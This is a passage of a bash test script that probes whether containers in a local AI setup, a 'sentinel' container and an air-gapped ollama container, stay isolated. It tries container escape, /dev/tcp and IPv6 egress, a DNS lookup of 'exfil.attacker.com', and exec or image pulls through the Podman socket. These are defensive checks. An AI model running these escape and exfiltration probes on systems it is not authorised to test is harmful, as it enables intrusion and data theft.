if [ "$EXEC_RC" -eq 0 ] && echo "$EXEC_OUT" | grep -q "STATUS: 201"; then
    fail "escape" "Podman socket allows container creation with host mounts" \
        "creation blocked" "container created" "S0" "2"
else
    pass "escape" "Podman socket cannot create privileged containers" "2"
fi

# /proc and /sys access
exec_in "$CTR_SENTINEL" cat /proc/1/environ
if [ "$EXEC_RC" -eq 0 ] && [ -n "$EXEC_OUT" ]; then
    # Check if it's the container's own environ (expected) or host's
    if echo "$EXEC_OUT" | grep -q "SENTINEL_"; then
        pass "escape" "/proc/1/environ shows container env only (not host)" "2"
    else
        fail "escape" "/proc/1/environ may expose host environment" \
            "container env" "unknown env content" "S2" "2"
    fi
else
    pass "escape" "/proc/1/environ not readable" "2"
fi

exec_in "$CTR_SENTINEL" ls /sys/firmware/
if [ "$EXEC_RC" -eq 0 ] && [ -n "$EXEC_OUT" ]; then
    warn "escape" "/sys/firmware/ is accessible" "Exposes hardware info: $EXEC_OUT" "2"
else
    pass "escape" "/sys/firmware/ not accessible" "2"
fi

exec_in "$CTR_SENTINEL" cat /proc/kallsyms
if [ "$EXEC_RC" -eq 0 ] && echo "$EXEC_OUT" | grep -qv "0000000000000000"; then
    fail "escape" "Kernel symbols readable with real addresses" \
        "zeroed or inaccessible" "real addresses visible" "S2" "2"
else
    pass "escape" "Kernel symbols zeroed or inaccessible" "2"
fi

# Kernel version disclosure
exec_in "$CTR_SENTINEL" uname -a
KERNEL_INFO="$EXEC_OUT"
_jsonl "2" "escape" "kernel_version_disclosure" "info" "" "$KERNEL_INFO" "S4"
echo "  [INFO] Kernel version visible: $KERNEL_INFO"
echo "         (informational — useful for targeted kernel exploits)"

# Mount namespace escape
exec_in "$CTR_SENTINEL" mount -t proc proc /mnt
if [ "$EXEC_RC" -ne 0 ]; then
    pass "escape" "Cannot mount additional filesystems" "2"
else
    podman exec "$CTR_SENTINEL" umount /mnt 2>/dev/null || true
    fail "escape" "mount succeeded inside container" "permission denied" "mount worked" "S0" "2"
fi

# Device access
exec_in "$CTR_SENTINEL" ls /dev/
EXPECTED_DEVS="null zero random urandom tty console"
UNEXPECTED_DEVS=""
for dev in $(echo "$EXEC_OUT" | tr '\n' ' '); do
    case "$dev" in
        null|zero|random|urandom|tty|console|pts|fd|stdin|stdout|stderr|full|ptmx|shm|mqueue) ;;
        *) UNEXPECTED_DEVS="$UNEXPECTED_DEVS $dev" ;;
    esac
done
if [ -z "$UNEXPECTED_DEVS" ]; then
    pass "escape" "Only standard devices in /dev/" "2"
else
    _jsonl "2" "escape" "unexpected_devices" "info" "standard only" "$UNEXPECTED_DEVS" "S4"
    echo "  [INFO] Non-standard devices in /dev/:$UNEXPECTED_DEVS"
fi

# nsenter
exec_in "$CTR_SENTINEL" nsenter --target 1 --mount --uts --ipc --net --pid
if [ "$EXEC_RC" -ne 0 ]; then
    pass "escape" "nsenter into host namespaces blocked" "2"
else
    fail "escape" "nsenter into host namespaces SUCCEEDED" "permission denied" "namespace entered" "S0" "2"
fi

echo

# ── 6. Air Gap Escape Attempts ───────────────────────────────────

echo "6. Air gap escape attempts"

# DNS tunnelling — if DNS works at all, data can be exfiltrated via TXT records
exec_in "$CTR_OLLAMA" bash -c 'echo -e "GET / HTTP/1.0\r\nHost: dns.google\r\n\r\n" > /dev/tcp/dns.google/80' 2>/dev/null
if [ "$EXEC_RC" -ne 0 ]; then
    pass "air_gap_escape" "DNS tunnelling not possible (no external DNS)" "2"
else
    fail "air_gap_escape" "DNS resolution works from ollama" "blocked" "DNS resolves" "S0" "2"
fi

# ICMP egress
if tool_exists "$CTR_OLLAMA" ping; then
    exec_in "$CTR_OLLAMA" ping -c 1 -W 3 8.8.8.8
    if [ "$EXEC_RC" -ne 0 ]; then
        pass "air_gap_escape" "ICMP egress from ollama blocked" "2"
    else
        fail "air_gap_escape" "ICMP egress from ollama SUCCEEDED" "blocked" "ping succeeded" "S1" "2"
    fi
else
    # Try raw socket approach
    exec_in "$CTR_OLLAMA" python3 -c "
import socket, struct, os, time
sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
sock.settimeout(3)
# ICMP echo request
checksum = 0
header = struct.pack('!BBHHH', 8, 0, checksum, os.getpid() & 0xFFFF, 1)
sock.sendto(header, ('8.8.8.8', 0))
print('ICMP sent')
" 2>/dev/null
    if [ "$EXEC_RC" -ne 0 ]; then
        pass "air_gap_escape" "ICMP egress from ollama blocked (raw socket denied)" "2"
    else
        # Check if it actually sent
        if echo "$EXEC_OUT" | grep -q "ICMP sent"; then
            fail "air_gap_escape" "ICMP raw socket available in ollama" "blocked" "socket created" "S1" "2"
        else
            pass "air_gap_escape" "ICMP attempt failed from ollama" "2"
        fi
    fi
fi

# Route to egress network
HAS_DEFAULT_ROUTE=0
if tool_exists "$CTR_OLLAMA" ip; then
    exec_in "$CTR_OLLAMA" ip route
    ROUTE_OUT="$EXEC_OUT"
    # ip route: look for "default " at line start (not just substring)
    if echo "$ROUTE_OUT" | grep -q "^default "; then
        HAS_DEFAULT_ROUTE=1
    fi
else
    exec_in "$CTR_OLLAMA" cat /proc/net/route
    ROUTE_OUT="$EXEC_OUT"
    # /proc/net/route: hex format. A default route has Destination=00000000
    # AND Gateway!=00000000 (non-zero gateway means actual external routing).
    # Destination=00000000 with Gateway=00000000 just means "directly connected".
    if echo "$ROUTE_OUT" | awk '$2 == "00000000" && $3 != "00000000" {found=1} END {exit !found}'; then
        HAS_DEFAULT_ROUTE=1
    fi
fi
_jsonl "2" "air_gap_escape" "ollama_routes" "info" "" "$ROUTE_OUT" ""
if [ "$HAS_DEFAULT_ROUTE" -eq 1 ]; then
    fail "air_gap_escape" "ollama has a default route" "no default route" "default route present" "S0" "2"
else
    pass "air_gap_escape" "ollama has no default route (air gap enforced at routing level)" "2"
fi

# ARP discovery
if tool_exists "$CTR_OLLAMA" arp; then
    exec_in "$CTR_OLLAMA" arp -a
elif tool_exists "$CTR_OLLAMA" ip; then
    exec_in "$CTR_OLLAMA" ip neigh
else
    exec_in "$CTR_OLLAMA" cat /proc/net/arp
fi
ARP_OUT="$EXEC_OUT"
_jsonl "2" "air_gap_escape" "ollama_arp_table" "info" "" "$ARP_OUT" "S4"
echo "  [INFO] ollama ARP/neighbour table: $(echo "$ARP_OUT" | wc -l) entries"

# Ollama API as proxy — could 'ollama pull' be an egress channel?
exec_in "$CTR_OLLAMA" bash -c 'echo -e "POST /api/pull HTTP/1.0\r\nHost: localhost\r\nContent-Length: 44\r\n\r\n{\"name\":\"test-probe:latest\",\"insecure\":true}" > /dev/tcp/localhost/11434' 2>/dev/null
if [ "$EXEC_RC" -eq 0 ]; then
    _jsonl "2" "air_gap_escape" "ollama_pull_as_proxy" "info" "" \
        "Ollama API is accessible internally — pull could be an egress channel if external access existed" "S4"
    echo "  [INFO] Ollama pull API accessible (benign — air gap prevents actual egress)"
else
    pass "air_gap_escape" "Ollama API not reachable for pull proxy test" "2"
fi

# IPv6 egress
if tool_exists "$CTR_OLLAMA" curl; then
    exec_in "$CTR_OLLAMA" curl -6 --max-time 5 http://ifconfig.me
    if [ "$EXEC_RC" -ne 0 ]; then
        pass "air_gap_escape" "IPv6 egress from ollama blocked" "2"
    else
        fail "air_gap_escape" "IPv6 egress from ollama SUCCEEDED" "blocked" "response received" "S0" "2"
    fi
elif tool_exists "$CTR_OLLAMA" python3; then
    exec_in "$CTR_OLLAMA" python3 -c "
import socket
s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
s.settimeout(3)
s.connect(('2606:4700:4700::1111', 80))
print('CONNECTED')
s.close()
" 2>/dev/null
    if [ "$EXEC_RC" -ne 0 ] || ! echo "$EXEC_OUT" | grep -q "CONNECTED"; then
        pass "air_gap_escape" "IPv6 egress from ollama blocked" "2"
    else
        fail "air_gap_escape" "IPv6 egress from ollama SUCCEEDED" "blocked" "connected" "S0" "2"
    fi
else
    skip "air_gap_escape" "IPv6 egress check" "no curl or python3 in ollama" "2"
fi

echo

# ── 7. Cross-Container Pivoting ──────────────────────────────────

echo "7. Cross-container pivoting"

# Sentinel → ollama shell via Podman socket
exec_in "$CTR_SENTINEL" python3 -c "
import http.client, socket, json
class PC(http.client.HTTPConnection):
    def __init__(self, sp):
        super().__init__('localhost')
        self.sp = sp
    def connect(self):
        self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        self.sock.connect(self.sp)
conn = PC('/run/podman/podman.sock')
# Try to exec into sentinel-ollama
payload = json.dumps({'AttachStdin': False, 'AttachStdout': True, 'AttachStderr': True, 'Cmd': ['whoami'], 'Tty': False})
conn.request('POST', '/v4.0.0/libpod/containers/sentinel-ollama/exec', body=payload,
             headers={'Content-Type': 'application/json'})
resp = conn.getresponse()
print(f'STATUS: {resp.status}')
data = resp.read().decode()[:200]
print(data)
" 2>/dev/null
if [ "$EXEC_RC" -eq 0 ] && echo "$EXEC_OUT" | grep -q "STATUS: 2"; then
    fail "pivot" "sentinel can exec into sentinel-ollama via Podman socket" \
        "exec blocked" "exec created" "S0" "2"
else
    pass "pivot" "sentinel cannot exec into sentinel-ollama via Podman socket" "2"
fi

# Network service scanning — enumerate Ollama endpoints
exec_in "$CTR_SENTINEL" python3 -c "
import urllib.request, json
endpoints = ['/api/tags', '/api/ps', '/api/version', '/api/show']
for ep in endpoints:
    try:
        resp = urllib.request.urlopen(f'http://sentinel-ollama:11434{ep}', timeout=3)
        print(f'  OPEN {ep}: {resp.status}')
    except Exception as e:
        print(f'  CLOSED {ep}: {e}')
"
OLLAMA_ENDPOINTS="$EXEC_OUT"
_jsonl "2" "pivot" "ollama_endpoint_scan" "info" "" "$OLLAMA_ENDPOINTS" "S4"
echo "  [INFO] Ollama API endpoints accessible from sentinel:"
echo "$OLLAMA_ENDPOINTS" | while IFS= read -r line; do echo "         $line"; done

# Ollama model deletion (DESTRUCTIVE — gated)
if [ "$DESTRUCTIVE" -eq 1 ]; then
    exec_in "$CTR_SENTINEL" python3 -c "
import urllib.request
# This would DELETE the model — only run with --destructive flag
req = urllib.request.Request(
    'http://sentinel-ollama:11434/api/delete',
    data=b'{\"name\":\"qwen3:14b\"}',
    headers={'Content-Type': 'application/json'},
    method='DELETE'
)
try:
    resp = urllib.request.urlopen(req, timeout=5)
    print(f'STATUS: {resp.status}')
except urllib.error.HTTPError as e:
    print(f'STATUS: {e.code}')
except Exception as e:
    print(f'ERROR: {e}')
"
    if [ "$EXEC_RC" -eq 0 ] && echo "$EXEC_OUT" | grep -q "STATUS: 200"; then
        fail "pivot" "sentinel CAN delete ollama models (DoS/model poisoning vector)" \
            "deletion blocked" "model deleted" "S0" "2"
        echo "         WARNING: qwen3:14b may have been deleted! Re-pull with: podman exec sentinel-ollama ollama pull qwen3:14b"
    else
        pass "pivot" "sentinel cannot delete ollama models" "2"
    fi
else
    skip "pivot" "Ollama model deletion test" "requires --destructive flag" "2"
fi

echo

# ── 8. GPU Side-Channel (Informational) ──────────────────────────

echo "8. GPU side-channel (informational)"

# nvidia-smi from sentinel (it shouldn't have GPU visibility)
exec_in "$CTR_SENTINEL" nvidia-smi
if [ "$EXEC_RC" -eq 0 ]; then
    warn "escape" "sentinel container has GPU visibility (nvidia-smi works)" \
        "Consider restricting GPU access to ollama only" "2"
    _jsonl "2" "gpu" "sentinel_nvidia_smi" "warn" "not available" "nvidia-smi works" "S4"
else
    pass "gpu" "sentinel has no GPU visibility (nvidia-smi not available)" "2"
fi

# GPU memory inspection from ollama
exec_in "$CTR_OLLAMA" nvidia-smi
if [ "$EXEC_RC" -eq 0 ]; then
    _jsonl "2" "gpu" "ollama_nvidia_smi" "info" "" "nvidia-smi available (expected — ollama uses GPU)" "S4"
    echo "  [INFO] nvidia-smi available in ollama (expected — GPU access needed)"
    # Check if it shows other processes
    if echo "$EXEC_OUT" | grep -v "ollama\|No running processes" | grep -q "PID"; then
        warn "gpu" "GPU shows processes from other containers/host" \
            "Shared RTX 3060 — cross-process memory leakage theoretically possible" "2"
    else
        pass "gpu" "GPU process list shows only ollama processes" "2"
    fi
else
    _jsonl "2" "gpu" "ollama_nvidia_smi" "info" "" "nvidia-smi not available in ollama" "S4"
    echo "  [INFO] nvidia-smi not available in ollama (GPU may use different driver interface)"
fi

echo

# ── 9. Podman Proxy Enforcement (v2) ────────────────────────────

echo "9. Podman proxy enforcement (v2)"

# Test proxy container list filtering — does the proxy expose ALL host containers
# or just sandbox containers? (Assessment Section 3.4)
exec_in "$CTR_SENTINEL" python3 -c "
import http.client, socket, json
class PC(http.client.HTTPConnection):
    def __init__(self, sp):
        super().__init__('localhost')
        self.sp = sp
    def connect(self):
        self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        self.sock.connect(self.sp)
# Use the proxy socket (not the real Podman socket)
try:
    conn = PC('/run/podman/podman.sock')
    conn.request('GET', '/v5.0.0/containers/json?all=true')
    resp = conn.getresponse()
    data = json.loads(resp.read())
    # Count total containers visible
    names = []
    for c in data:
        n = c.get('Names', c.get('names', ['?']))
        if isinstance(n, list):
            names.extend(n)
        else:
            names.append(str(n))
    # Check if non-sandbox containers are visible
    non_sandbox = [n for n in names if not n.startswith('/sentinel-sandbox-') and not n.startswith('sentinel-sandbox-')]
    print(f'TOTAL_VISIBLE: {len(data)}')
    print(f'NON_SANDBOX: {len(non_sandbox)}')
    for n in non_sandbox[:5]:
        print(f'  LEAKED: {n}')
except Exception as e:
    print(f'ERROR: {e}')
" 2>/dev/null
if [ "$EXEC_RC" -eq 0 ]; then
    if echo "$EXEC_OUT" | grep -q "LEAKED:"; then
        NON_SANDBOX_COUNT="$(echo "$EXEC_OUT" | grep "^NON_SANDBOX:" | awk '{print $2}')"
        fail "proxy" "Proxy exposes $NON_SANDBOX_COUNT non-sandbox containers" \
            "sandbox containers only" "$(echo "$EXEC_OUT" | grep 'LEAKED:' | head -3 | tr '\n' '; ')" "S2" "2"
    elif echo "$EXEC_OUT" | grep -q "ERROR:"; then
        pass "proxy" "Proxy socket not accessible (no container info leak)" "2"
    else
        pass "proxy" "Proxy only exposes sandbox containers" "2"
    fi
else
    pass "proxy" "Proxy socket not accessible from sentinel" "2"
fi

# Test proxy blocks image pull (prevents using ollama pull as egress)
exec_in "$CTR_SENTINEL" python3 -c "
import http.client, socket, json
class PC(http.client.HTTPConnection):
    def __init__(self, sp):
        super().__init__('localhost')
        self.sp = sp
    def connect(self):
        self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        self.sock.connect(self.sp)
try:
    conn = PC('/run/podman/podman.sock')
    conn.request('POST', '/v5.0.0/images/pull?reference=alpine:latest')
    resp = conn.getresponse()
    print(f'STATUS: {resp.status}')
    print(resp.read().decode()[:200])
except Exception as e:
    print(f'ERROR: {e}')
" 2>/dev/null
if [ "$EXEC_RC" -eq 0 ] && echo "$EXEC_OUT" | grep -q "STATUS: 200"; then
    fail "proxy" "Proxy allows image pull (potential egress vector)" \
        "pull blocked" "pull succeeded" "S1" "2"
else
    pass "proxy" "Proxy blocks image pull requests" "2"
fi

# Test proxy blocks exec on tracked containers
exec_in "$CTR_SENTINEL" python3 -c "
import http.client, socket, json
class PC(http.client.HTTPConnection):
    def __init__(self, sp):
        super().__init__('localhost')
        self.sp = sp
    def connect(self):
        self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        self.sock.connect(self.sp)
try:
    conn = PC('/run/podman/podman.sock')
    payload = json.dumps({'Cmd': ['whoami']})
    conn.request('POST', '/v5.0.0/containers/sentinel/exec',
                 body=payload, headers={'Content-Type': 'application/json'})
    resp = conn.getresponse()
    print(f'STATUS: {resp.status}')
except Exception as e:
    print(f'ERROR: {e}')
" 2>/dev/null
if [ "$EXEC_RC" -eq 0 ] && echo "$EXEC_OUT" | grep -q "STATUS: 2"; then
    fail "proxy" "Proxy allows exec into sentinel container" \
        "exec blocked" "exec allowed" "S0" "2"
else
    pass "proxy" "Proxy blocks exec operations" "2"
fi

# v2: Test proxy validates security fields on container create (Assessment P1.4)
# Send a container create with MISSING security fields — proxy should reject
exec_in "$CTR_SENTINEL" python3 -c "
import http.client, socket, json
class PC(http.client.HTTPConnection):
    def __init__(self, sp):
        super().__init__('localhost')
        self.sp = sp
    def connect(self):
        self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        self.sock.connect(self.sp)
try:
    conn = PC('/run/podman/podman.sock')
    # Create a container WITHOUT security hardening
    payload = json.dumps({
        'Image': 'sentinel',
        'Cmd': ['echo', 'test'],
        'Name': 'sentinel-sandbox-test-insecure',
        'NetworkDisabled': False,
        'HostConfig': {}
    })
    conn.request('POST', '/v5.0.0/containers/create',
                 body=payload, headers={'Content-Type': 'application/json'})
    resp = conn.getresponse()
    print(f'STATUS: {resp.status}')
    body = resp.read().decode()[:300]
    print(body)
    # Clean up if it was created
    if resp.status in (200, 201):
        data = json.loads(body)
        cid = data.get('Id', '')
        if cid:
            conn2 = PC('/run/podman/podman.sock')
            conn2.request('DELETE', f'/v5.0.0/containers/{cid}?force=true')
            conn2.getresponse()
except Exception as e:
    print(f'ERROR: {e}')
" 2>/dev/null
if [ "$EXEC_RC" -eq 0 ] && echo "$EXEC_OUT" | grep -q "STATUS: 201"; then
    warn "proxy" "Proxy allows container create without security fields" \
        "Proxy does not validate NetworkDisabled/CapDrop/ReadonlyRootfs — relies on sandbox.py" "2"
elif echo "$EXEC_OUT" | grep -q "STATUS: 4"; then
    pass "proxy" "Proxy rejects container create without security fields" "2"
else
    pass "proxy" "Proxy socket not accessible or create denied" "2"
fi

echo

# ── 10. /proc/self Exploitation Vectors (v2) ─────────────────────

echo "10. /proc/self exploitation vectors (v2)"

# /proc/self/mountinfo reveals host paths (bind mount source paths)
exec_in "$CTR_SENTINEL" cat /proc/self/mountinfo
if [ "$EXEC_RC" -eq 0 ]; then
    MOUNTINFO="$EXEC_OUT"
    # Extract source paths from mountinfo (field 4 in some formats, or after "- " marker)
    # mountinfo format: ID parent major:minor root mount_point options ... - type source options
    HOST_REVEAL=""
    # Check if host username appears in mount paths
    HOST_USER="$(whoami)"
    if echo "$MOUNTINFO" | grep -q "/home/$HOST_USER"; then
        HOST_REVEAL="$HOST_REVEAL host_user_path"
    fi
    # Check if it reveals the project directory path
    if echo "$MOUNTINFO" | grep -q "/sentinel/"; then
        HOST_REVEAL="$HOST_REVEAL project_path"
    fi

    if [ -n "$HOST_REVEAL" ]; then
        warn "proc_exploit" "/proc/self/mountinfo reveals host filesystem layout" \
            "Disclosed:$HOST_REVEAL — aids targeted host attacks" "2"
    else
        pass "proc_exploit" "/proc/self/mountinfo does not reveal sensitive host paths" "2"
    fi
    _jsonl "2" "proc_exploit" "mountinfo_content" "info" "" "$(echo "$MOUNTINFO" | head -10)" ""
else
    pass "proc_exploit" "/proc/self/mountinfo not readable" "2"
fi

# /proc/self/cgroup — reveals host user ID and container runtime info
exec_in "$CTR_SENTINEL" cat /proc/self/cgroup
if [ "$EXEC_RC" -eq 0 ]; then
    CGROUP_OUT="$EXEC_OUT"
    if echo "$CGROUP_OUT" | grep -q "libpod-"; then
        # Container ID is in the cgroup path — this is the container's own ID
        _jsonl "2" "proc_exploit" "cgroup_container_id_leak" "info" "" \
            "Container ID visible in cgroup path" "S4"
        echo "  [INFO] Container ID visible in cgroup path (informational)"
    fi
    if echo "$CGROUP_OUT" | grep -qE "user-[0-9]+\.slice"; then
        UID_LEAKED="$(echo "$CGROUP_OUT" | grep -oE "user-[0-9]+\.slice" | head -1)"
        warn "proc_exploit" "/proc/self/cgroup reveals host UID" \
            "$UID_LEAKED — aids privilege escalation planning" "2"
    else
        pass "proc_exploit" "/proc/self/cgroup does not leak host UID" "2"
    fi
else
    pass "proc_exploit" "/proc/self/cgroup not readable" "2"
fi

# /proc/self/maps — reveals ASLR layout (useful for exploit dev)
exec_in "$CTR_SENTINEL" cat /proc/self/maps
if [ "$EXEC_RC" -eq 0 ]; then
    MAP_LINES="$(echo "$EXEC_OUT" | wc -l)"
    _jsonl "2" "proc_exploit" "proc_maps_readable" "info" "" "$MAP_LINES lines" "S4"
    echo "  [INFO] /proc/self/maps readable ($MAP_LINES lines) — ASLR layout disclosed"
else
    pass "proc_exploit" "/proc/self/maps not readable" "2"
fi

# /proc/net/fib_trie — reveals network routing internals
exec_in "$CTR_SENTINEL" cat /proc/net/fib_trie
if [ "$EXEC_RC" -eq 0 ]; then
    _jsonl "2" "proc_exploit" "fib_trie_readable" "info" "" "$(echo "$EXEC_OUT" | head -5)" "S4"
    echo "  [INFO] /proc/net/fib_trie readable — internal routing table disclosed"
else
    pass "proc_exploit" "/proc/net/fib_trie not readable" "2"
fi

echo

# ── 11. DNS Side-Channel Testing (v2) ───────────────────────────

echo "11. DNS side-channel testing (v2)"

# Check /etc/resolv.conf in air-gapped ollama — should have NO external nameservers
exec_in "$CTR_OLLAMA" cat /etc/resolv.conf
if [ "$EXEC_RC" -eq 0 ]; then
    RESOLV_OUT="$EXEC_OUT"
    _jsonl "2" "dns_sidechannel" "ollama_resolv_conf" "info" "" "$RESOLV_OUT" ""
    # Check for external nameservers (8.8.8.8, 1.1.1.1, etc.)
    EXTERNAL_NS=""
    for ns in "8.8.8.8" "8.8.4.4" "1.1.1.1" "1.0.0.1" "9.9.9.9"; do
        if echo "$RESOLV_OUT" | grep -q "$ns"; then
            EXTERNAL_NS="$EXTERNAL_NS $ns"
        fi
    done
    if [ -n "$EXTERNAL_NS" ]; then
        fail "dns_sidechannel" "ollama resolv.conf has external nameservers" \
            "no external DNS" "found:$EXTERNAL_NS" "S1" "2"
    else
        pass "dns_sidechannel" "ollama resolv.conf has no external nameservers" "2"
    fi
    # Check if ANY nameserver is configured
    if echo "$RESOLV_OUT" | grep -q "^nameserver"; then
        NS_LIST="$(echo "$RESOLV_OUT" | grep "^nameserver" | awk '{print $2}' | tr '\n' ' ')"
        _jsonl "2" "dns_sidechannel" "ollama_nameservers" "info" "" "$NS_LIST" ""
        echo "  [INFO] ollama nameservers: $NS_LIST"
    else
        pass "dns_sidechannel" "ollama has no nameserver configured" "2"
    fi
else
    skip "dns_sidechannel" "ollama resolv.conf check" "cannot read /etc/resolv.conf" "2"
fi

# Check /etc/resolv.conf in sentinel — document what DNS it uses
exec_in "$CTR_SENTINEL" cat /etc/resolv.conf
if [ "$EXEC_RC" -eq 0 ]; then
    _jsonl "2" "dns_sidechannel" "sentinel_resolv_conf" "info" "" "$EXEC_OUT" ""
    echo "  [INFO] sentinel resolv.conf: $(echo "$EXEC_OUT" | grep "^nameserver" | head -3 | tr '\n' '; ')"
fi

# Python socket.getaddrinfo from ollama — test if DNS resolution works at all
if tool_exists "$CTR_OLLAMA" python3; then
    exec_in "$CTR_OLLAMA" python3 -c "
import socket
try:
    result = socket.getaddrinfo('exfil.attacker.com', 80, socket.AF_INET, socket.SOCK_STREAM)
    print(f'RESOLVED: {result}')
except socket.gaierror as e:
    print(f'BLOCKED: {e}')
except Exception as e:
    print(f'ERROR: {e}')
"
    if echo "$EXEC_OUT" | grep -q "RESOLVED:"; then
        fail "dns_sidechannel" "DNS resolution works from ollama (potential exfil channel)" \
            "resolution blocked" "DNS resolves" "S0" "2"
    else
        pass "dns_sidechannel" "DNS resolution blocked from ollama" "2"
    fi
else
    skip "dns_sidechannel" "Python DNS resolution test" "no python3 in ollama" "2"
fi

# UDP egress test (DNS uses UDP 53 — test if UDP packets can leave)
if tool_exists "$CTR_OLLAMA" python3; then
    exec_in "$CTR_OLLAMA" python3 -c "
import socket
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(3)
    # Try to send a DNS query to 8.8.8.8
    s.sendto(b'\\x00\\x01\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x07example\\x03com\\x00\\x00\\x01\\x00\\x01', ('8.8.8.8', 53))
    data = s.recvfrom(512)
    print(f'RESPONSE: {len(data[0])} bytes')
except Exception as e:
    print(f'BLOCKED: {e}')
"
    if echo "$EXEC_OUT" | grep -q "RESPONSE:"; then
        fail "dns_sidechannel" "UDP egress from ollama to port 53 succeeds" \
            "UDP blocked" "DNS response received" "S0" "2"
    else
        pass "dns_sidechannel" "UDP egress from ollama blocked (no DNS exfil possible)" "2"
    fi
else
    skip "dns_sidechannel" "UDP egress test" "no python3 in ollama" "2"
fi

echo

} # end run_phase_2


# ═══════════════════════════════════════════════════════════════════
# Run selected phase(s)
# ═══════════════════════════════════════════════════════════════════

case "$PHASE" in
    1)   run_phase_1 ;;
    2)   run_phase_2 ;;
    all) run_phase_1; run_phase_2 ;;
esac

# ═══════════════════════════════════════════════════════════════════
# Summary
# ═══════════════════════════════════════════════════════════════════

echo "============================================================"
echo "  B3 v2 Perimeter Test Results"
echo "  Phase: $PHASE"
echo "  $(date)"
echo "============================================================"
echo "  Results: $PASS passed, $FAIL failed, $WARN warnings (known gaps), $SKIP skipped"
echo "  JSONL:   $RESULTS_FILE"
echo
echo "  v2 additions: /proc/self info leakage, mount validation,"
echo "                proxy enforcement, DNS side-channel"
echo

if [ "$FAIL" -gt 0 ]; then
    echo "  FAILURES DETECTED — review results above"
    if [ "$WARN" -gt 0 ]; then
        echo "  ($WARN known gaps documented as warnings — track in hardening backlog)"
    fi
else
    echo "  All checks passed."
    if [ "$WARN" -gt 0 ]; then
        echo "  ($WARN known gaps documented as warnings — track in hardening backlog)"
    fi
fi

[ "$FAIL" -gt 0 ] && exit 1 || exit 0
